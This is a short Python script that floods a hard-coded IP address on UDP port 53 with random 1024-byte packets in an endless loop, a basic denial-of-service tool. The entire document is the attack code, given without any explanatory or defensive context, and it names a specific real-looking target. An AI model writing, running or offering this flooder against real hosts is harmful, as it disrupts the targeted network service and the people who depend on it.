import socket
from os import urandom as _urandom
import random
import threading

UDP_IP = "46.166.151.201"
UDP_PORT = 53

def udp():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (UDP_IP, UDP_PORT)
            sock.sendto(random._urandom(1024), address)
            for i in range(2):
                sock.sendto(random._urandom(1024), address)
            print("Sent")
        except:
            sock.close()
            print("Error")

if __name__ == "__main__":
    t = threading.Thread(target=udp)
    t.start()